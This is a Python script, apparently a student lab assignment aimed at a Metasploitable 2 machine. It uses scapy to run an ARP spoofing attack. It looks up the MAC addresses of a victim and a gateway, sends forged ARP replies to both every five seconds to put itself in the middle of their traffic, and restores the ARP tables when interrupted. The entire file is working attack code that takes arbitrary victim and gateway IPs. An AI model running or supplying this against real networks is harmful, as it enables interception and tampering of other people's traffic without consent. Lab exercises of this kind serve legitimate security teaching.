from datetime import datetime
import sys, time

# As per assignment requirements
from scapy.all import sendp # To send packets to Meta2
from scapy.layers.l2 import Ether,ARP,srp

# Define variables
author = "JON TAN"
current_date = datetime.now().strftime("%d/%m/%Y")

# Get mac address using ip address
def get_mac_address(ip: str):
    # Broadcast mac
    broadcast_mac = Ether(dst="ff:ff:ff:ff:ff:ff")

    answered= srp(broadcast_mac/ARP(pdst=ip), timeout=2, verbose=False)[0]

    for sent, received in answered:
        # print(received.hwsrc)
        return received.hwsrc
    return None


# Sends packets for spoofing
def arp_spoof(target_ip:str,target_mac:str, spoofing_ip:str, spoofing_mac:str):
    packet = ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoofing_ip)
    print(packet)
    sendp(Ether(dst=target_mac)/packet,verbose=False)

# Points the ip address back to the right mac address
def restore_arp(original_ip:str, original_mac:str, source_ip:str, source_mac:str):
    packet = ARP(op=2,pdst=original_ip,hwdst=original_mac,psrc=source_ip,hwsrc=source_mac)
    sendp(Ether(dst=original_mac)/packet,verbose=False)

def main():
    # Display the output
    print(f"Author : {author}")
    print(f"Current Date : {current_date}")

    # Checks for correct number of arguments in command given
    if len(sys.argv) != 3:
        print("Please run this command: \nsudo python3 arpspoof.py <Victim_IP> <Gateway(Router)_IP>")
        sys.exit(1)

    # IP addresses
    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    # MAC addresses
    victim_mac = get_mac_address(victim_ip)
    gateway_mac = get_mac_address(gateway_ip)

    print("======================================================")
    print(f"[+] Victim {victim_ip} --> {victim_mac}")
    print(f"[+] Gateway {gateway_ip} --> {gateway_mac}")
    print("======================================================")

    try:
        while True:
            # Sending packets to keep the ARP cache alive
            print("Sending packets every 5 seconds.... \n*** Press Ctrl+C to exit ***")
            arp_spoof(victim_ip, victim_mac, gateway_ip, gateway_mac)
            arp_spoof(gateway_ip, gateway_mac, victim_ip, victim_mac)
            time.sleep(5) # Calls the arp_spoof every 5 seconds
            print("")
    except KeyboardInterrupt: # To escape the program
        # Points the IP back to the correct MAC
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore_arp(gateway_ip, gateway_mac, victim_ip, victim_mac)
        print("\n======================================================")
        print("-----------  Restoring MAC address to IP  -----------")

if __name__ == "__main__":
    main()
